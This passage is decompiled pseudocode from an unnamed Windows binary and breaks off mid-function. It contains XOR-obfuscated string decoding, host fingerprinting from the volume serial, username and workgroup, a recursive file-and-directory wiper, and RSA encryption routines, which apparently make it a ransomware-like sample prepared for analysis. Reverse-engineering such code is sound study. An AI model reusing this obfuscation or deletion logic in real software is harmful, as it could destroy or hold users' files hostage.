  int v13; // [esp+30h] [ebp-10h]
  int v14; // [esp+34h] [ebp-Ch]
  int v15; // [esp+38h] [ebp-8h]
  int v16; // [esp+3Ch] [ebp-4h] BYREF

  v16 = 0;
  GetNativeSystemInfo(&SystemInfo);
  if ( SystemInfo.wProcessorArchitecture == 9 )
  {
    if ( (dword_429DF0 & 1) != 0 )
    {
      ModuleHandleA = (HMODULE)dword_429DEC;
    }
    else
    {
      dword_429DF0 |= 1u;
      v0 = alloca(16);
      if ( v11 )
      {
        v15 = v11 - byte_41E39B + 2;
        v14 = v11 - byte_41E39C + 3;
        v1 = 0;
        LOBYTE(SystemInfo.dwOemId) = 0;
        v13 = v11 - "€<€6B)4" + 4;
        do
        {
          v2 = v15;
          v11[v1] = byte_41E3A8[v1] ^ (byte_41E398[v1] + (v1 & 0x7F));
          byte_41E39B[v11 - byte_41E39A + v1] = byte_41E3A9[v1] ^ (byte_41E399[v1] + ((v1 + 1) & 0x7F));
          byte_41E39B[v2 + v1] = byte_41E3AA[v1] ^ (byte_41E39A[v1] + ((v1 + 2) & 0x7F));
          byte_41E39C[v14 + v1] = byte_41E3AB[v1] ^ (byte_41E39B[v1] + ((v1 + 3) & 0x7F));
          a6b4[v13 + v1] = byte_41E3AC[v1] ^ (byte_41E39C[v1] + ((v1 + 4) & 0x7F));
          v3 = a6b4[v1] + ((v1 + 5) & 0x7F);
          v1 += 6;
          v11[v1 - 1] = byte_41E3A7[v1] ^ v3;
        }
        while ( v1 < 12 );
      }
      ModuleHandleA = GetModuleHandleA(v11);
      dword_429DEC = (int)ModuleHandleA;
    }
    if ( ModuleHandleA )
    {
      if ( (dword_429DF0 & 2) == 0 )
      {
        dword_429DF0 |= 2u;
        v5 = alloca(16);
        if ( v10 )
        {
          v6 = 0;
          v10[14] = 0;
          do
          {
            v10[v6] = byte_41E460[v6] ^ (byte_41E450[v6] + (v6 & 0x7F));
            v7 = byte_41E451[v6] + ((v6 + 1) & 0x7F);
            v6 += 2;
            v10[v6 - 1] = byte_41E45F[v6] ^ v7;
          }
          while ( v6 < 14 );
        }
        dword_429DE8 = (int (__cdecl *)(_DWORD, _DWORD))GetProcAddress(ModuleHandleA, v10);
      }
      if ( dword_429DE8 )
      {
        CurrentProcess = GetCurrentProcess();
        dword_429DE8(CurrentProcess, &v16);
      }
    }
  }
  return v16;
}
// 429DE8: using guessed type int (__cdecl *dword_429DE8)(_DWORD, _DWORD);
// 429DEC: using guessed type int dword_429DEC;
// 429DF0: using guessed type int dword_429DF0;

//----- (00404B60) --------------------------------------------------------
DWORD sub_404B60()
{
  DWORD result; // eax
  void *v1; // esp
  int i; // eax
  char v3; // dl
  CHAR v4[12]; // [esp-Ch] [ebp-110h] BYREF
  CHAR Buffer[260]; // [esp+0h] [ebp-104h] BYREF

  result = VolumeSerialNumber;
  if ( !VolumeSerialNumber )
  {
    v1 = alloca(12);
    if ( v4 )
    {
      v4[11] = 0;
      for ( i = 0; i < 11; v4[i - 1] = byte_41E47B[i] ^ v3 )
      {
        v3 = byte_41E470[i] + (i & 0x7F);
        ++i;
      }
    }
    if ( GetEnvironmentVariableA(v4, Buffer, 0x104u) )
    {
      PathAddBackslashA(Buffer);
      if ( !GetVolumeInformationA(Buffer, 0, 0, &VolumeSerialNumber, 0, 0, 0, 0) )
        VolumeSerialNumber = 16711935;
    }
    return VolumeSerialNumber;
  }
  return result;
}

//----- (00404C10) --------------------------------------------------------
int __usercall sub_404C10@<eax>(ULONG (__stdcall *a1)(PVOID Parameter)@<edi>, void *a2@<esi>, int a3)
{
  int result; // eax
  DWORD ThreadId; // [esp+4h] [ebp-4h] BYREF

  ThreadId = 0;
  for ( result = (int)CreateThread(0, 0, a1, a2, 0, &ThreadId);
        !result;
        result = (int)CreateThread(0, 0, a1, a2, 0, &ThreadId) )
  {
    Sleep(0x3E8u);
  }
  if ( a3 )
  {
    CloseHandle((HANDLE)result);
    return 1;
  }
  return result;
}

//----- (00404C70) --------------------------------------------------------
int sub_404C70()
{
  int v0; // edi
  HANDLE ProcessHeap; // eax
  char *v2; // esi
  HANDLE v3; // eax
  CHAR *v4; // eax
  int v5; // edx
  unsigned int v6; // eax
  char *i; // ecx
  HANDLE v8; // eax
  SIZE_T v10; // [esp-8h] [ebp-14h]
  DWORD pcbBuffer; // [esp+8h] [ebp-4h] BYREF

  v0 = 0;
  pcbBuffer = 260;
  ProcessHeap = GetProcessHeap();
  v2 = (char *)HeapAlloc(ProcessHeap, 8u, 0x184u);
  if ( v2 )
  {
    if ( GetUserNameA(v2, &pcbBuffer) || GetLastError() != 122 )
    {
LABEL_7:
      v5 = strlen(v2);
      if ( v5 )
      {
        v6 = 0;
        for ( i = v2; v5 > 0; ++i )
        {
          v6 = dword_4205D0[(unsigned __int8)(v6 ^ *i)] ^ (v6 >> 8);
          --v5;
        }
        v0 = ~v6;
      }
      else
      {
        v0 = 0;
      }
      goto LABEL_12;
    }
    if ( !pcbBuffer )
    {
LABEL_12:
      v8 = GetProcessHeap();
      HeapFree(v8, 0, v2);
      return v0;
    }
    v10 = pcbBuffer + 128;
    v3 = GetProcessHeap();
    v4 = (CHAR *)HeapReAlloc(v3, 8u, v2, v10);
    v2 = v4;
    if ( v4 )
    {
      GetUserNameA(v4, &pcbBuffer);
      goto LABEL_7;
    }
  }
  return v0;
}
// 4205D0: using guessed type int dword_4205D0[128];

//----- (00404D40) --------------------------------------------------------
char *sub_404D40()
{
  LPSTR v0; // esi
  LPBYTE v1; // eax
  CHAR *v2; // eax
  HANDLE ProcessHeap; // eax
  char *result; // eax
  LPBYTE bufptr; // [esp+4h] [ebp-8h] BYREF
  LPBYTE v6; // [esp+8h] [ebp-4h] BYREF

  v0 = 0;
  bufptr = 0;
  v6 = 0;
  if ( NetServerGetInfo(0, 0x65u, &bufptr) || NetWkstaGetInfo(0, 0x64u, &v6) )
  {
LABEL_7:
    v1 = v6;
    goto LABEL_8;
  }
  v1 = v6;
  if ( v6 && *((_DWORD *)v6 + 2) )
  {
    v2 = sub_4053E0(*((const WCHAR **)v6 + 2));
    v0 = v2;
    if ( v2 )
      v0 = CharUpperA(v2);
    goto LABEL_7;
  }
LABEL_8:
  if ( bufptr )
  {
    NetApiBufferFree(bufptr);
    v1 = v6;
  }
  if ( v1 )
    NetApiBufferFree(v1);
  if ( v0 )
    return v0;
  ProcessHeap = GetProcessHeap();
  result = (char *)HeapAlloc(ProcessHeap, 8u, 0x8Au);
  if ( result )
    strcpy(result, "WORKGROUP");
  return result;
}

//----- (00404E00) --------------------------------------------------------
LPVOID __cdecl sub_404E00(int a1, int a2)
{
  HANDLE ProcessHeap; // eax

  ProcessHeap = GetProcessHeap();
  return HeapAlloc(ProcessHeap, 8u, a2 * a1 + 128);
}

//----- (00404E20) --------------------------------------------------------
BOOL __cdecl sub_404E20(LPVOID lpMem)
{
  HANDLE ProcessHeap; // eax

  ProcessHeap = GetProcessHeap();
  return HeapFree(ProcessHeap, 0, lpMem);
}

//----- (00404E40) --------------------------------------------------------
BOOL __usercall sub_404E40@<eax>(DWORD a1@<eax>, HANDLE hFile, LARGE_INTEGER liDistanceToMove)
{
  return SetFilePointerEx(hFile, liDistanceToMove, 0, a1);
}

//----- (00404E60) --------------------------------------------------------
void __cdecl sub_404E60(LPCSTR lpString2)
{
  void *v1; // esp
  HANDLE ProcessHeap; // eax
  CHAR *v3; // eax
  const CHAR *v4; // esi
  HANDLE FirstFileA; // esi
  void *v6; // esp
  HANDLE v7; // eax
  CHAR *v8; // eax
  CHAR *v9; // esi
  HANDLE v10; // eax
  HANDLE v11; // eax
  SIZE_T v12; // [esp-14h] [ebp-168h]
  PSTR v13; // [esp-14h] [ebp-168h]
  char v14[4]; // [esp-10h] [ebp-164h] BYREF
  SIZE_T v15; // [esp-Ch] [ebp-160h]
  char v16[20]; // [esp-8h] [ebp-15Ch] BYREF
  struct _WIN32_FIND_DATAA FindFileData; // [esp+Ch] [ebp-148h] BYREF
  HANDLE v18; // [esp+14Ch] [ebp-8h]
  PSTR pszDest; // [esp+150h] [ebp-4h]

  if ( lpString2 )
  {
    v1 = alloca(8);
    if ( v16 )
      strcpy(v16, "\\*.*");
    v15 = &v16[strlen(v16) + 1] - &v16[1] + strlen(lpString2) + 129;
    ProcessHeap = GetProcessHeap();
    v3 = (CHAR *)HeapAlloc(ProcessHeap, 8u, v15);
    pszDest = v3;
    if ( v3 )
    {
      lstrcpynA(v3, lpString2, 260);
      v4 = pszDest;
      StrCatBuffA(pszDest, v16, 260);
      FirstFileA = FindFirstFileA(v4, &FindFileData);
      v18 = FirstFileA;
      if ( FirstFileA == (HANDLE)-1 )
      {
        GetLastError();
      }
      else
      {
        v6 = alloca(8);
        if ( v14 )
          strcpy(v14, "..");
        do
        {
          if ( strcmp(FindFileData.cFileName, ".") && strcmp(FindFileData.cFileName, v14) )
          {
            v12 = strlen(FindFileData.cFileName) + strlen(lpString2) + 130;
            v7 = GetProcessHeap();
            v8 = (CHAR *)HeapAlloc(v7, 8u, v12);
            v9 = v8;
            if ( !v8 )
              return;
            lstrcpynA(v8, lpString2, 260);
            PathAddBackslashA(v9);
            StrCatBuffA(v9, FindFileData.cFileName, 260);
            if ( (FindFileData.dwFileAttributes & 0x10) != 0 )
            {
              sub_404E60(v9);
            }
            else
            {
              SetFileAttributesA(v9, 0);
              if ( !SetFileAttributesA(v9, 0x80u) || !DeleteFileA(v9) && !DeleteFileA(v9) )
                MoveFileExA(v9, 0, 4u);
            }
            v10 = GetProcessHeap();
            HeapFree(v10, 0, v9);
            FirstFileA = v18;
          }
        }
        while ( FindNextFileA(FirstFileA, &FindFileData) );
        FindClose(FirstFileA);
        v13 = pszDest;
        v11 = GetProcessHeap();
        HeapFree(v11, 0, v13);
        SetFileAttributesA(lpString2, 0);
        RemoveDirectoryA(lpString2);
      }
    }
  }
}

//----- (004050D0) --------------------------------------------------------
BOOL __cdecl sub_4050D0(LPCWSTR lpExistingFileName, LPCWSTR lpNewFileName)
{
  int i; // edi
  BOOL v3; // esi

  for ( i = 0; i < 3; ++i )
  {
    v3 = MoveFileW(lpExistingFileName, lpNewFileName);
    if ( v3 )
      break;
    if ( GetLastError() != 5 )
      GetLastError();
    SwitchToThread();
  }
  return v3;
}

//----- (00405180) --------------------------------------------------------
LPSTR sub_405180()
{
  HANDLE CurrentProcess; // eax
  HANDLE v1; // eax
  HANDLE v2; // eax
  char *v18; // eax
  LPSTR result; // eax
  struct _SYSTEM_INFO SystemInfo; // [esp+0h] [ebp-30h] BYREF
  DWORD ReturnLength; // [esp+24h] [ebp-Ch] BYREF
  int TokenInformation; // [esp+28h] [ebp-8h] BYREF
  void *TokenHandle; // [esp+2Ch] [ebp-4h] BYREF

  qword_429C10 = __rdtsc();
  dword_429C68 = sub_405440();
  dword_429C18 = GetTickCount();
  GetSystemTimes(&IdleTime, &KernelTime, &UserTime);
  CurrentProcess = GetCurrentProcess();
  GetProcessTimes(CurrentProcess, &CreationTime, &ExitTime, &stru_429DCC, &stru_429DD4);
  dword_429C1C = GetCurrentProcessId();
  dword_429C20 = GetCurrentThreadId();
  dword_429C24 = (int)GetCurrentProcess();
  dword_429C28 = (int)GetCurrentThread();
  v1 = GetCurrentProcess();
  GetProcessHandleCount(v1, &pdwHandleCount);
  GetSystemInfo(&::SystemInfo);
  dword_429C54 = sub_404B60();
  dword_429C58 = sub_404C70();
  dword_429C5C = sub_4046B0();
  GetNativeSystemInfo(&SystemInfo);
  dword_429C64 = SystemInfo.wProcessorArchitecture == 9;
  v2 = GetCurrentProcess();
  TokenHandle = 0;
  ReturnLength = 4;
  TokenInformation = 0;
  if ( OpenProcessToken(v2, 8u, &TokenHandle) )
    GetTokenInformation(TokenHandle, TokenSessionId, &TokenInformation, 4u, &ReturnLength);
  if ( TokenHandle )
    CloseHandle(TokenHandle);
  dword_429C60 = TokenInformation;
  _EAX = -2147483646;
  __asm { cpuid }
  dword_429C6C[0] = _EAX;
  dword_429C6C[1] = _EBX;
  dword_429C6C[2] = _ECX;
  dword_429C6C[3] = _EDX;
  _EAX = -2147483645;
  __asm { cpuid }
  dword_429C7C[0] = _EAX;
  dword_429C7C[1] = _EBX;
  dword_429C7C[2] = _ECX;
  dword_429C7C[3] = _EDX;
  _EAX = -2147483644;
  __asm { cpuid }
  dword_429C8C[0] = _EAX;
  dword_429C8C[1] = _EBX;
  dword_429C8C[2] = _ECX;
  dword_429C8C[3] = _EDX;
  v18 = sub_404D40();
  result = lstrcpynA(String1, v18, 260);
  dword_429DA0 = (int)byte_405120;
  return result;
}
// 429C10: using guessed type __int64 qword_429C10;
// 429C18: using guessed type int dword_429C18;
// 429C1C: using guessed type int dword_429C1C;
// 429C20: using guessed type int dword_429C20;
// 429C24: using guessed type int dword_429C24;
// 429C28: using guessed type int dword_429C28;
// 429C54: using guessed type int dword_429C54;
// 429C58: using guessed type int dword_429C58;
// 429C5C: using guessed type int dword_429C5C;
// 429C60: using guessed type int dword_429C60;
// 429C64: using guessed type int dword_429C64;
// 429C68: using guessed type int dword_429C68;
// 429C6C: using guessed type _DWORD dword_429C6C[4];
// 429C7C: using guessed type _DWORD dword_429C7C[4];
// 429C8C: using guessed type _DWORD dword_429C8C[4];
// 429DA0: using guessed type int dword_429DA0;

//----- (00405320) --------------------------------------------------------
LPVOID sub_405320()
{
  LPVOID v0; // esi
  HANDLE CurrentProcess; // eax
  HANDLE ProcessHeap; // eax
  LPVOID result; // eax
  BYTE v4[16]; // [esp+8h] [ebp-10h] BYREF

  v0 = 0;
  if ( !dword_429DDC )
  {
    sub_405180();
    dword_429DDC = 1;
  }
  qword_429C10 = __rdtsc();
  dword_429C68 = sub_405440();
  dword_429C18 = GetTickCount();
  GetSystemTimes(&IdleTime, &KernelTime, &UserTime);
  CurrentProcess = GetCurrentProcess();
  GetProcessTimes(CurrentProcess, &CreationTime, &ExitTime, &stru_429DCC, &stru_429DD4);
  if ( sub_4043B0((const BYTE *)&qword_429C10, 0x1CCu, v4) )
  {
    ProcessHeap = GetProcessHeap();
    result = HeapAlloc(ProcessHeap, 8u, 0x184u);
    v0 = result;
    if ( !result )
      return result;
    sub_404490((int)result, (int)v4);
  }
  return v0;
}
// 429C10: using guessed type __int64 qword_429C10;
// 429C18: using guessed type int dword_429C18;
// 429C68: using guessed type int dword_429C68;
// 429DDC: using guessed type int dword_429DDC;

//----- (004053E0) --------------------------------------------------------
CHAR *__usercall sub_4053E0@<eax>(const WCHAR *a1@<ebx>)
{
  CHAR *v1; // esi
  int v2; // edi
  HANDLE ProcessHeap; // eax
  CHAR *result; // eax

  v1 = 0;
  if ( !a1 )
    return 0;
  v2 = WideCharToMultiByte(0, 0, a1, -1, 0, 0, 0, 0);
  if ( v2 )
  {
    ProcessHeap = GetProcessHeap();
    result = (CHAR *)HeapAlloc(ProcessHeap, 8u, 2 * v2 + 128);
    v1 = result;
    if ( !result )
      return result;
    WideCharToMultiByte(0, 0, a1, -1, result, v2, 0, 0);
  }
  return v1;
}

//----- (00405440) --------------------------------------------------------
signed int sub_405440()
{
  HANDLE (__stdcall *v0)(); // edi
  signed int TickCount; // ebx
  HANDLE ProcessHeap; // eax
  BYTE *v3; // eax
  _DWORD *v4; // esi
  HANDLE v5; // eax
  char *v6; // eax
  char *v7; // ecx
  unsigned int v8; // ebx
  int v9; // edx
  int v10; // edx
  HANDLE v11; // eax
  SIZE_T v13; // [esp-4h] [ebp-1Ch]
  DWORD cbData; // [esp+Ch] [ebp-Ch] BYREF
  __int64 v15; // [esp+10h] [ebp-8h]

  cbData = 0x2000;
  v0 = GetProcessHeap;
  TickCount = GetTickCount();
  v15 = TickCount;
  ProcessHeap = GetProcessHeap();
  v3 = (BYTE *)HeapAlloc(ProcessHeap, 8u, 0x2080u);
  v4 = v3;
  if ( !v3 )
    return TickCount;
  if ( RegQueryValueExA(HKEY_PERFORMANCE_DATA, "2", 0, 0, v3, &cbData) == 234 )
  {
    while ( 1 )
    {
      cbData += 1024;
      if ( !cbData )
        break;
      v13 = cbData + 128;
      v5 = GetProcessHeap();
      v4 = HeapReAlloc(v5, 8u, v4, v13);
      if ( !v4 )
        return v15;
      if ( RegQueryValueExA(HKEY_PERFORMANCE_DATA, "2", 0, 0, (LPBYTE)v4, &cbData) != 234 )
        goto LABEL_6;
    }
  }
  else
  {
LABEL_6:
    v6 = (char *)v4 + v4[6];
    if ( v6 )
    {
      v7 = &v6[*((_DWORD *)v6 + 2)];
      if ( v7 )
      {
        v8 = *((_DWORD *)v6 + 8);
        v9 = 0;
        if ( v8 )
        {
          while ( *((_DWORD *)v7 + 1) != 674 )
          {
            v7 += *(_DWORD *)v7;
            if ( ++v9 >= v8 )
              goto LABEL_13;
          }
          LODWORD(v15) = sub_4184E0(
                           *((_QWORD *)v6 + 6) - *(_QWORD *)&v6[*((_DWORD *)v6 + 1) + *((_DWORD *)v7 + 9)],
                           *((_QWORD *)v6 + 7));
          HIDWORD(v15) = v10;
        }
LABEL_13:
        v0 = GetProcessHeap;
      }
    }
  }
  v11 = v0();
  HeapFree(v11, 0, v4);
  return v15;
}
// 40554A: variable 'v10' is possibly undefined

//----- (00405580) --------------------------------------------------------
int __usercall sub_405580@<eax>(_DWORD *a1@<eax>, const __m128i *a2, int a3)
{
  unsigned int v4; // esi
  int v5; // ebx
  int v7; // esi
  LPVOID v8; // ecx
  unsigned int v9; // [esp-4h] [ebp-44h]
  int v10[3]; // [esp+10h] [ebp-30h] BYREF
  int v11[3]; // [esp+1Ch] [ebp-24h] BYREF
  int v12; // [esp+28h] [ebp-18h] BYREF
  int v13; // [esp+2Ch] [ebp-14h]
  LPVOID lpMem; // [esp+30h] [ebp-10h]
  _DWORD *v15; // [esp+34h] [ebp-Ch]
  unsigned int v16; // [esp+38h] [ebp-8h] BYREF
  int v17; // [esp+3Ch] [ebp-4h] BYREF

  v4 = a1[1];
  v5 = (int)(a1 + 2);
  if ( v4 != (unsigned int)(sub_407920((int)(a1 + 2)) + 7) >> 3 )
    return -16512;
  if ( v4 > 0x400 )
    return -16512;
  v11[0] = 1;
  v11[1] = 1;
  v11[2] = (int)&v17;
  v17 = 0;
  if ( sub_408030(v11, (int *)v5) <= 0 )
    return -16512;
  if ( !(32 * *(_DWORD *)(v5 + 4)) )
    return -16512;
  if ( (**(_DWORD **)(v5 + 8) & 1) == 0 )
    return -16512;
  v10[0] = 1;
  v10[1] = 1;
  v16 = 0;
  v10[2] = (int)&v16;
  v15 = a1 + 5;
  if ( sub_408030(v10, a1 + 5) <= 0 )
    return -16512;
  v13 = 0;
  lpMem = 0;
  v9 = a1[1];
  v12 = 1;
  v7 = sub_407B20(&v12, a2, v9);
  if ( !v7 )
  {
    if ( sub_408030((int *)v5, &v12) < 0 )
    {
      v16 = a1[1];
      v7 = sub_409230(v5, &v12, &v12, (int)v15, a1 + 26);
      if ( !v7 )
        v7 = sub_407CC0(v16, a3, (int)&v12);
    }
    else
    {
      v7 = -4;
    }
  }
  v8 = lpMem;
  if ( lpMem )
  {
    if ( 4 * v13 )
    {
      sub_413EB0((int)lpMem, 0, 4 * v13);
      v8 = lpMem;
    }
    off_423FA4(v8);
  }
  if ( v7 )
    return v7 - 17024;
  else
    return 0;
}
// 423FA4: using guessed type int (__cdecl *off_423FA4)(_DWORD);

//----- (004056E0) --------------------------------------------------------
int __usercall sub_4056E0@<eax>(unsigned int *a1@<edi>, _BYTE *a2, unsigned int a3, int a4, int a5)
{
  int v5; // esi
  unsigned int v6; // eax
  unsigned int v7; // ecx
  unsigned int v9; // eax
  char v11[64]; // [esp+8h] [ebp-48h] BYREF
  unsigned int v12; // [esp+48h] [ebp-8h]
  int v13; // [esp+4Ch] [ebp-4h] BYREF
  unsigned int v14; // [esp+58h] [ebp+8h]

  v5 = 0;
  sub_413EB0((int)v11, 0, 0x40u);
  v6 = *a1;
  v13 = 0;
  if ( v6 )
    LOBYTE(v6) = *(_BYTE *)(v6 + 8);
  else
    LOBYTE(v6) = 0;
  v7 = a3;
  v6 = (unsigned __int8)v6;
  v12 = (unsigned __int8)v6;
  if ( a3 )
  {
    while ( 1 )
    {
      v14 = v6;
      if ( v7 < v6 )
        v14 = v7;
      if ( !*a1 )
        break;
      v5 = (*(int (__cdecl **)(unsigned int))(*a1 + 16))(a1[1]);
      if ( v5 )
        goto LABEL_20;
      if ( !*a1 )
        break;
      v5 = (*(int (__cdecl **)(unsigned int, int, int))(*a1 + 20))(a1[1], a4, a5);
      if ( v5 )
        goto LABEL_20;
      if ( !*a1 )
        break;
      v5 = (*(int (__cdecl **)(unsigned int, int *, int))(*a1 + 20))(a1[1], &v13, 4);
      if ( v5 )
        goto LABEL_20;
      if ( !*a1 )
        break;
      v9 = (*(int (__cdecl **)(unsigned int, char *))(*a1 + 24))(a1[1], v11);
      v5 = v9;
      if ( v9 )
        goto LABEL_20;
      if ( v14 )
      {
        do
          *a2++ ^= v11[v9++];
        while ( v9 < v14 );
      }
      ++HIBYTE(v13);
      a3 -= v14;
      if ( !a3 )
        goto LABEL_20;
      v7 = a3;
      v6 = v12;
    }
    v5 = -20736;
  }
LABEL_20:
  sub_413EB0((int)v11, 0, 0x40u);
  return v5;
}
// 4056E0: using guessed type char var_48[64];

//----- (004057F0) --------------------------------------------------------
int __cdecl sub_4057F0(_DWORD *a1, _DWORD *a2, const __m128i *a3, const __m128i *a4)
{
  unsigned int v4; // esi
  unsigned int v5; // ebx
  unsigned int v6; // eax
  int v7; // eax
  int result; // eax
  int v9; // edi
  __int8 *v10; // esi
  int v11; // edi
  __int8 *v12; // esi
  __int8 *v13; // [esp-Ch] [ebp-2Ch]
  unsigned int v14[3]; // [esp+Ch] [ebp-14h] BYREF
  __int8 *v15; // [esp+18h] [ebp-8h]
  __int8 *v16; // [esp+1Ch] [ebp-4h]

  if ( !sub_4072A0 )
    return -16512;
  switch ( a1[42] )
  {
    case 3:
      v16 = (__int8 *)&unk_41ED60;
      break;
    case 4:
      v16 = (__int8 *)&unk_41EDC0;
      break;
    case 5:
      v16 = (__int8 *)&unk_41EDF0;
      break;
    case 6:
      v16 = (__int8 *)&unk_41EE20;
      break;
    case 7:
      v16 = (__int8 *)&unk_41EE50;
      break;
    case 8:
      v16 = (__int8 *)&unk_41EE80;
      break;
    case 9:
      v16 = (__int8 *)&unk_41ED90;
      break;
    default:
      return -16512;
  }
  v4 = a1[1];
  v5 = (unsigned __int8)v16[8];
  v6 = 2 * v5 + 34;
  if ( v6 < 0x20 || v4 < v6 )
    return -16512;
  sub_413EB0((int)a4, 0, v4);
  a4->m128i_i8[0] = 0;
  v7 = sub_407150(a2, (unsigned int)a4->m128i_u32 + 1, v5, 0, 0);
  if ( v7 )
    return v7 - 17536;
  v9 = (int)a4->m128i_i32 + v5 + 1;
  result = sub_409970((int)v16, v9);
  if ( !result )
  {
    v10 = (__int8 *)(v4 - v5);
    v15 = v10;
    v10[v9 - 34] = 1;
    sub_415930((unsigned int)&v10[v9 - 33], a3, 0x20u);
    memset(v14, 0, sizeof(v14));
    v11 = sub_409940(v14, (int)v16);
    if ( !v11 )
    {
      v12 = v15 - 1;
      v13 = v15 - 1;
      v15 = &a4->m128i_i8[v5 + 1];
      v16 = &a4->m128i_i8[1];
      v11 = sub_4056E0(v14, v15, (unsigned int)v13, (int)a4->m128i_i32 + 1, v5);
      if ( !v11 )
        v11 = sub_4056E0(v14, v16, v5, (int)v15, (int)v12);
    }
    sub_4098E0(v14);
    if ( v11 )
      return v11;
    else
      return sub_405580(a1, a4, (int)a4);
  }
  return result;
}

//----- (004059A0) --------------------------------------------------------
int __usercall sub_4059A0@<eax>(_DWORD *a1@<eax>, _DWORD *a2, const __m128i *a3, const __m128i *a4)
{
  unsigned int v5; // eax
  const __m128i *v6; // esi
  unsigned int v7; // ecx
  __int8 *v8; // eax
  int v9; // esi
  _BYTE *v10; // eax
  unsigned int v12; // esi
  char v14[48]; // [esp+Ch] [ebp-58h] BYREF
  __m128i v15; // [esp+3Ch] [ebp-28h] BYREF
  unsigned int v16; // [esp+4Ch] [ebp-18h]
  int v17; // [esp+50h] [ebp-14h]
  unsigned int v18; // [esp+54h] [ebp-10h]
  __int8 *v19; // [esp+58h] [ebp-Ch]
  __int8 *v20; // [esp+5Ch] [ebp-8h]

  v5 = a2[1];
  if ( v5 < 0x2B )
    return -16512;
  v6 = a4;
  v7 = v5 - 35;
  v16 = v5 - 35;
  a4->m128i_i8[0] = 0;
  if ( !sub_4072A0 )
    return -16512;
  a4->m128i_i8[1] = 2;
  v8 = &a4->m128i_i8[2];
  v20 = &a4->m128i_i8[2];
  if ( v7 )
  {
    while ( 2 )
    {
      --v16;
      v17 = 100;
      while ( 1 )
      {
        v19 = v8;
        v18 = 1;
        sub_413EB0((int)v14, 0, 0x30u);
        if ( a1[4] <= a1[7] && !a1[5] || (v9 = sub_407060((int)a1, 0, 0)) == 0 )
        {
          while ( 1 )
          {
            v10 = (char *)a1 + 15;
            do
            {
              if ( (*v10)++ != 0xFF )
                break;
              --v10;
            }
            while ( (int)&v10[1 - (_DWORD)a1] > 0 );
            v9 = sub_406620((unsigned int)(a1 + 8), (unsigned int *)&v15);
            if ( v9 )
              break;
            v12 = v18;
            if ( v18 > 0x10 )
              v12 = 16;
            sub_415930((unsigned int)v19, &v15, v12);
            v19 += v12;
            v18 -= v12;
            if ( !v18 )
            {
              v9 = sub_406F60(a1, (int)v14);
              if ( !v9 )
                ++a1[4];
              break;
            }
          }
          sub_413EB0((int)v14, 0, 0x30u);
          sub_413EB0((int)&v15, 0, 0x10u);
        }
        if ( *v20 )
          break;
        if ( !--v17 )
          return v9 - 17536;
        if ( v9 )
          break;
        v8 = v20;
      }
      if ( !v17 || v9 )
        return v9 - 17536;
      v8 = ++v20;
      if ( v16 )
        continue;
      break;
    }
    v6 = a4;
  }
  *v8 = 0;
  sub_415930((unsigned int)(v8 + 1), a3, 0x20u);
  return sub_405580(a2, v6, (int)v6);
}

//----- (00405B50) --------------------------------------------------------
int __usercall sub_405B50@<eax>(_DWORD *a1@<ebx>)
{
  int v1; // ecx
  int result; // eax
  int v3; // ecx
  int v4; // ecx
  int v5; // ecx
  int v6; // ecx
  int v7; // ecx
  int v8; // ecx
  int v9; // ecx
  int v10; // ecx
  int v11; // ecx
  int v12; // ecx
  int v13; // ecx
  int v14; // ecx

  if ( a1 )
  {
    if ( a1 != (_DWORD *)-140 )
    {
      v1 = a1[37];
      if ( v1 )
      {
        if ( 4 * a1[36] )
          sub_413EB0(v1, 0, 4 * a1[36]);
        result = off_423FA4(a1[37]);
      }
      a1[35] = 1;
      a1[36] = 0;
      a1[37] = 0;
    }
    if ( a1 != (_DWORD *)-152 )
    {
      v3 = a1[40];
      if ( v3 )
      {
        if ( 4 * a1[39] )
          sub_413EB0(v3, 0, 4 * a1[39]);
        result = off_423FA4(a1[40]);
      }
      a1[38] = 1;
      a1[39] = 0;
      a1[40] = 0;
    }
    if ( a1 != (_DWORD *)-104 )
    {
      v4 = a1[28];
      if ( v4 )
      {
        if ( 4 * a1[27] )
          sub_413EB0(v4, 0, 4 * a1[27]);
        result = off_423FA4(a1[28]);
      }
      a1[26] = 1;
      a1[27] = 0;
      a1[28] = 0;
    }
    if ( a1 != (_DWORD *)-32 )
    {
      v5 = a1[10];
      if ( v5 )
      {
        if ( 4 * a1[9] )
          sub_413EB0(v5, 0, 4 * a1[9]);
        result = off_423FA4(a1[10]);
      }
      a1[8] = 1;
      a1[9] = 0;
      a1[10] = 0;
    }
    if ( a1 != (_DWORD *)-56 )
    {
      v6 = a1[16];
      if ( v6 )
      {
        if ( 4 * a1[15] )
          sub_413EB0(v6, 0, 4 * a1[15]);
        result = off_423FA4(a1[16]);
      }
      a1[14] = 1;
      a1[15] = 0;
      a1[16] = 0;
    }
    if ( a1 != (_DWORD *)-44 )
    {
      v7 = a1[13];
      if ( v7 )
      {
        if ( 4 * a1[12] )
          sub_413EB0(v7, 0, 4 * a1[12]);
        result = off_423FA4(a1[13]);
      }
      a1[11] = 1;
      a1[12] = 0;
      a1[13] = 0;
    }
    if ( a1 != (_DWORD *)-20 )
    {
      v8 = a1[7];
      if ( v8 )
      {
        if ( 4 * a1[6] )
          sub_413EB0(v8, 0, 4 * a1[6]);
        result = off_423FA4(a1[7]);
      }
      a1[5] = 1;
      a1[6] = 0;
      a1[7] = 0;
    }
    if ( a1 != (_DWORD *)-8 )
    {
      v9 = a1[4];
      if ( v9 )
      {
        if ( 4 * a1[3] )
          sub_413EB0(v9, 0, 4 * a1[3]);
        result = off_423FA4(a1[4]);
      }
      a1[2] = 1;
      a1[3] = 0;
      a1[4] = 0;
    }
    if ( a1 != (_DWORD *)-128 )
    {
      v10 = a1[34];
      if ( v10 )
      {
        if ( 4 * a1[33] )
          sub_413EB0(v10, 0, 4 * a1[33]);
        result = off_423FA4(a1[34]);
      }
      a1[32] = 1;
      a1[33] = 0;
      a1[34] = 0;
    }
    if ( a1 != (_DWORD *)-116 )
    {
      v11 = a1[31];
      if ( v11 )
      {
        if ( 4 * a1[30] )
          sub_413EB0(v11, 0, 4 * a1[30]);
        result = off_423FA4(a1[31]);
      }
      a1[29] = 1;
      a1[30] = 0;
      a1[31] = 0;
    }
    if ( a1 != (_DWORD *)-92 )
    {
      v12 = a1[25];
      if ( v12 )
      {
        if ( 4 * a1[24] )
          sub_413EB0(v12, 0, 4 * a1[24]);
        result = off_423FA4(a1[25]);
      }
      a1[23] = 1;
      a1[24] = 0;
      a1[25] = 0;
    }
    if ( a1 != (_DWORD *)-80 )
    {
      v13 = a1[22];
      if ( v13 )
      {
        if ( 4 * a1[21] )
          sub_413EB0(v13, 0, 4 * a1[21]);
        result = off_423FA4(a1[22]);
      }
      a1[20] = 1;
      a1[21] = 0;
